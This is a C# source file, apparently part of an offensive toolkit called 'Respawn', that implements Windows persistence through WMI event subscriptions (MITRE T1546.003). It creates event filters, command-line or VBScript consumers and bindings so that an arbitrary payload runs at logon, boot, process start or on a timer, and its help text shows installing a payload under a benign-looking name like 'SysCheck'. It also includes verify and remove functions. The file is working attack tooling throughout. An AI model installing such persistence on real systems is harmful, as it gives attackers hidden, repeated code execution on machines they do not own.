using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;
using System.Management;
using System.Threading;

namespace Respawn.Techniques.WMI
{
    public class WmiModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "wmi";
        public string Name        => "WMI Subscriptions";
        public string Mitre       => "T1546.003";
        public string Description => "Persist by abusing Windows Management Instrumentation (WMI) event subscriptions, binding a custom WQL event filter to an action consumer (command-line or script) to automatically execute a payload when specific system conditions are met (such as system boot, process creation, or user logon).";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p5", "wmi");

            // 2. WMI ARCHITECTURE
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("  WMI ARCHITECTURE:");
            Console.ResetColor();
            Console.WriteLine("    - Filter   : Defines the event (logon, process start, etc.)");
            Console.WriteLine("    - Consumer : Defines the action (binary or VBScript)");
            Console.WriteLine("    - Binding  : Bridges the Filter to the Consumer");
            Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name",     "Unified name for WMI components");
            TechniqueHelpBuilder.RenderOption("-tr, --trigger",  "Trigger ID (logon, timer, boot, process)");
            TechniqueHelpBuilder.RenderOption("-c,  --consumer", "Consumer type (cmdline, script)");
            TechniqueHelpBuilder.RenderOption("-p,  --payload",  "Command string (for cmdline)");
            TechniqueHelpBuilder.RenderOption("-sc, --script",   "Path to .vbs (for script)");
            TechniqueHelpBuilder.RenderOption("-i,  --interval", "Seconds (for timer only)");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t wmi -a list-triggers");
            TechniqueHelpBuilder.RenderExample("Respawn -t wmi -a install -n \"SysCheck\" -p \"C:\\p.exe\" -tr logon -c cmdline");
            TechniqueHelpBuilder.RenderExample("Respawn -t wmi -a verify  -n \"SysCheck\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t wmi -a remove  -n \"SysCheck\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("triggers", StringComparison.OrdinalIgnoreCase))
                return WmiTriggers.All;

            if (optionType.Equals("consumers", StringComparison.OrdinalIgnoreCase))
                return WmiConsumers.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, out string error))
                return TechniqueResult.Fail(error);

            var triggerDef = WmiTriggers.GetById(ctx.Trigger);
            if (triggerDef == null)
                return TechniqueResult.Fail($"Unknown trigger '{ctx.Trigger}'. Use -a list-triggers to see available triggers.");

            var consumerDef = WmiConsumers.GetById(ctx.Consumer);
            if (consumerDef == null)
                return TechniqueResult.Fail($"Unknown consumer '{ctx.Consumer}'. Use -a list-consumers to see available consumers.");

            try
            {
                var scope = GetScope();

                if (FilterExists(scope, ctx.Name))
                    return TechniqueResult.Exists($"WMI subscription '{ctx.Name}' already exists.");

                // ── Filter ───────────────────────────────────────────────────────
                string query = ctx.Trigger.ToLower() == "timer"
                    ? BuildTimerQuery(ctx.Name, ctx.Interval)
                    : WmiTriggers.GetQuery(ctx.Trigger);

                if (string.IsNullOrEmpty(query))
                    return TechniqueResult.Fail($"Could not build WMI query for trigger '{ctx.Trigger}'.");

                if (ctx.Trigger.ToLower() == "timer")
                    CreateTimerInstruction(scope, ctx.Name, ctx.Interval);

                var filterPath = CreateFilter(scope, ctx.Name, query);
                // Console.WriteLine($"[-+++-] {filterPath}");

                // ── Consumer ─────────────────────────────────────────────────────
                var consumerPath = ctx.Consumer.ToLower() == "cmdline"
                    ? CreateCmdlineConsumer(scope, ctx.Name, ctx.Payload)
                    : CreateScriptConsumer(scope, ctx.Name, ctx.Script);
                // Console.WriteLine($"[-+++-] {consumerPath}");

                // ── Binding ──────────────────────────────────────────────────────
                CreateBinding(scope, ctx.Name, filterPath, consumerPath);

                return TechniqueResult.Ok($"Installed WMI subscription '{ctx.Name}' trigger '{ctx.Trigger}' consumer '{ctx.Consumer}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. WMI subscriptions require administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (string.IsNullOrEmpty(ctx.Name))
                return TechniqueResult.Fail("No name specified. Use -n <name>.");

            try
            {
                var scope = GetScope();

                if (!FilterExists(scope, ctx.Name))
                    return TechniqueResult.NotFound($"WMI subscription '{ctx.Name}' not found.");

                DeleteInstance(scope, "__FilterToConsumerBinding", $"Filter=\"__EventFilter.Name='{ctx.Name}'\"");
                DeleteInstance(scope, "CommandLineEventConsumer",  $"Name='{ctx.Name}'");
                DeleteInstance(scope, "ActiveScriptEventConsumer", $"Name='{ctx.Name}'");
                DeleteInstance(scope, "__EventFilter",             $"Name='{ctx.Name}'");
                DeleteInstance(scope, "__IntervalTimerInstruction",$"TimerID='{ctx.Name}'");

                return TechniqueResult.Ok($"Removed WMI subscription '{ctx.Name}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. WMI subscriptions require administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (string.IsNullOrEmpty(ctx.Name))
                return TechniqueResult.Fail("No name specified. Use -n <name>.");

            try
            {
                var scope = GetScope();

                bool filterExists   = FilterExists(scope, ctx.Name);
                bool consumerExists = ConsumerExists(scope, ctx.Name);
                bool bindingExists  = BindingExists(scope, ctx.Name);

                if (!filterExists && !consumerExists && !bindingExists)
                    return TechniqueResult.NotFound($"WMI subscription '{ctx.Name}' not found.");

                if (!filterExists || !consumerExists || !bindingExists)
                    return TechniqueResult.Fail(
                        $"WMI subscription '{ctx.Name}' is incomplete. " +
                        $"Filter: {filterExists} Consumer: {consumerExists} Binding: {bindingExists}");

                return TechniqueResult.Ok(
                    $"Verified WMI subscription '{ctx.Name}' — " +
                    $"Filter: OK | Consumer: OK | Binding: OK");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. WMI subscriptions require administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── WMI Helpers ─────────────────────────────────────────────────────────

        private ManagementScope GetScope()
        {
            var scope = new ManagementScope(@"\\.\root\subscription");
            scope.Connect();
            return scope;
        }

        private string CreateFilter(ManagementScope scope, string name, string query)
        {
            var filterClass = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
            var filter      = filterClass.CreateInstance();

            filter["Name"]           = name;
            filter["EventNameSpace"] = @"root\cimv2";
            filter["QueryLanguage"]  = "WQL";
            filter["Query"]          = query;

            var path = filter.Put();
            return path.Path;
        }

        private string CreateCmdlineConsumer(ManagementScope scope, string name, string payload)
        {
            var consumerClass = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null);
            var consumer      = consumerClass.CreateInstance();

            consumer["Name"]                = name;
            consumer["CommandLineTemplate"] = payload;

            // only set ExecutablePath if payload is a plain exe file
            if (System.IO.File.Exists(payload))
                consumer["ExecutablePath"] = payload;

            var path = consumer.Put();
            return path.Path;
        }

        private string CreateScriptConsumer(ManagementScope scope, string name, string scriptPath)
        {
            string scriptText = File.ReadAllText(scriptPath);

            var consumerClass = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null);
            var consumer      = consumerClass.CreateInstance();

            consumer["Name"]            = name;
            consumer["ScriptingEngine"] = "VBScript";
            consumer["ScriptText"]      = scriptText;

            var path = consumer.Put();
            return path.Path;
        }

        private void CreateBinding(ManagementScope scope, string name, string filterPath, string consumerPath)
        {
            var bindingClass = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null);
            var binding      = bindingClass.CreateInstance();

            binding["Filter"]   = filterPath;
            binding["Consumer"] = consumerPath;

            binding.Put();
        }

        private void CreateTimerInstruction(ManagementScope scope, string name, string interval)
        {
            if (!int.TryParse(interval, out int seconds) || seconds <= 0)
                throw new ArgumentException($"Invalid interval value '{interval}'. Must be a positive number of seconds.");

            var timerClass = new ManagementClass(
                new ManagementScope(@"\\.\root\cimv2"),
                new ManagementPath("__IntervalTimerInstruction"),
                null
            );
            var timer = timerClass.CreateInstance();

            timer["TimerID"]               = name;
            timer["IntervalBetweenEvents"] = (uint)(seconds * 1000);
            timer.Put();
        }

        private string BuildTimerQuery(string name, string interval) =>
            $"SELECT * FROM __TimerEvent WHERE TimerID = '{name}'";

        private bool FilterExists(ManagementScope scope, string name)
        {
            var query  = new ObjectQuery($"SELECT * FROM __EventFilter WHERE Name = '{name}'");
            var search = new ManagementObjectSearcher(scope, query);
            return search.Get().Count > 0;
        }

        private bool ConsumerExists(ManagementScope scope, string name)
        {
            var cmdQuery    = new ObjectQuery($"SELECT * FROM CommandLineEventConsumer WHERE Name = '{name}'");
            var scriptQuery = new ObjectQuery($"SELECT * FROM ActiveScriptEventConsumer WHERE Name = '{name}'");

            return new ManagementObjectSearcher(scope, cmdQuery).Get().Count > 0 ||
                   new ManagementObjectSearcher(scope, scriptQuery).Get().Count > 0;
        }

        private bool BindingExists(ManagementScope scope, string name)
        {
            var query  = new ObjectQuery($"SELECT * FROM __FilterToConsumerBinding WHERE Filter=\"__EventFilter.Name='{name}'\"");
            var search = new ManagementObjectSearcher(scope, query);
            return search.Get().Count > 0;
        }

        private void DeleteInstance(ManagementScope scope, string className, string whereClause)
        {
            try
            {
                var query  = new ObjectQuery($"SELECT * FROM {className} WHERE {whereClause}");
                var search = new ManagementObjectSearcher(scope, query);
                foreach (ManagementObject obj in search.Get())
                    obj.Delete();
            }
            catch { }
        }

        // ─── Validation ──────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No name specified. Use -n <name>.";
                return false;
            }
            if (string.IsNullOrEmpty(ctx.Trigger))
            {
                error = "No trigger specified. Use -tr <trigger-id> or see -a list-triggers.";
                return false;
            }
            if (string.IsNullOrEmpty(ctx.Consumer))
            {
                error = "No consumer specified. Use -c <consumer-id> or see -a list-consumers.";
                return false;
            }
            if (ctx.Consumer.Equals("cmdline", StringComparison.OrdinalIgnoreCase) &&
                string.IsNullOrEmpty(ctx.Payload))
            {
                error = "cmdline consumer requires -p <payload>.";
                return false;
            }
            if (ctx.Consumer.Equals("script", StringComparison.OrdinalIgnoreCase) &&
                string.IsNullOrEmpty(ctx.Script))
            {
                error = "script consumer requires -sc <path>.";
                return false;
            }
            if (ctx.Consumer.Equals("script", StringComparison.OrdinalIgnoreCase) &&
                !System.IO.File.Exists(ctx.Script))
            {
                error = $"Script file not found: '{ctx.Script}'.";
                return false;
            }
            if (ctx.Trigger.Equals("timer", StringComparison.OrdinalIgnoreCase) &&
                string.IsNullOrEmpty(ctx.Interval))
            {
                error = "Timer trigger requires -i <seconds>.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}